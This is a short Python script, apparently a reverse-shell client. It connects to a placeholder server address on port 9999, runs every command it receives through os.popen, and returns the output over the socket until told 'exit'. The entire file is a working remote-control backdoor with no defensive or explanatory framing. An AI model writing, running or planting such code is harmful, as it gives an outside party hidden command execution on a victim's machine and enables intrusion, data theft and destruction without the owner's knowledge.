import socket
import os

x = 1
ip = 'ip of server'
port = 9999

client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

client.connect((ip,port))
while x == 1:
    data = client.recv(1024)
    if data.decode() == "exit":
        x = 0
    result = os.popen(data.decode()).read()
    client.send(result.encode()+b".")

